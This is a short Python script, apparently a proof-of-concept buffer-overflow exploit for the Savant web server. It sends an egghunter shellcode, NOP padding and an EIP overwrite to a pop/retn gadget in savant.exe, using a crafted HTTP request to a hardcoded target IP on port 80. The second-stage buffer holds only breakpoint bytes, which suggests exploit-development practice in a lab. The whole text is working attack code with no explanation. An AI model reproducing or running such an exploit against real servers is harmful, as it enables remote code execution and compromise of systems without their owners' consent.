#!/usr/bin/python
import socket
 
banner = """
#----------------------------------------------#
Savant Exploit - Egghunter
#----------------------------------------------#
"""

target_address="172.16.73.129"
target_port=80

buffer2 = "R0cX" + "R0cX" + "\xcc" * 992
 
badbuffer = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x30\x63\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" 
badbuffer += "\x90"*(254-len(badbuffer))
badbuffer += "\x09\x1D\x40" # EIP overwrite 00401d09 savant.exe pop ebp, retn
httpmethod = "\xb0\x03\x04\x01\x7B\x15" # MOV AL, 3; ADD AL, 1; JPO 15

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n' + buffer2

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address, target_port))
sock.send(sendbuf)
sock.close()

